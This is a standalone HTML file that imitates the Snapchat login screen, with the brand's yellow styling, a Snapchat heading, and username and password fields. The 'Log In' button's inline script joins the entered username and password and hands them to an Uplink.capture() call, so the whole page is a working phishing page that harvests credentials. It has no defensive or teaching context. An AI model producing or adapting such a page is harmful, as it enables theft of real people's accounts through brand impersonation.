<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <style>
        body { background:#fffc00; color:#000; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding:50px; text-align:center; margin:0; }
        h2 { margin-bottom:30px; font-size:2rem; }
        input { width:100%; padding:15px; margin-bottom:10px; border:1px solid #000; border-radius:25px; box-sizing:border-box; font-size:1rem; }
        button { width:100%; padding:15px; background:#000; border:none; color:#fff; font-weight:bold; border-radius:25px; cursor:pointer; font-size:1rem; }
    </style>
</head>
<body>
    <h2>Snapchat</h2>
    <input type="text" id="u" placeholder="Username or Email">
    <input type="password" id="p" placeholder="Password">
    <button onclick="var u=document.getElementById('u').value; var p=document.getElementById('p').value; if(u && p) Uplink.capture(u + ':' + p);">Log In</button>
</body>
</html>
